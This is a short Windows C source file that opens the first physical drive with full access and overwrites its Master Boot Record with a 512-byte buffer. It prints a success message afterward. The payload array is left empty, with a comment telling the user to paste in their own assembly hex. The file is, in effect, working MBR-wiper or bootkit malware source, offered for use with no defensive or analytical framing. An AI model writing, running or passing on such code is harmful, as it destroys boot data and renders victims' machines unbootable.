#include <windows.h>

const unsigned char MasterBootRecord[] = {
    //Put here your assembly.asm hex, you can get it with HxD
};

int main() {
    DWORD ResultBytesWritten;
    HANDLE hDiskDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if(hDiskDevice == INVALID_HANDLE_VALUE) goto invalid_handle;
    bool ResultState = WriteFile(hDiskDevice, MasterBootRecord, 512, &ResultBytesWritten, 0);
    CloseHandle(hDiskDevice);

    if(!ResultState) goto writefile_failed;
    else printf("[+] MBR succesfully overwrote\n");
    Sleep(3000);
    return 0;


    invalid_handle:
        printf("[!] Cant handle PhysicalDrive0\n");
        Sleep(3000);
        return 0;

    writefile_failed:
        printf("[!] Failed to overwrite the MBR\n");
        Sleep(3000);
        return 0;
}
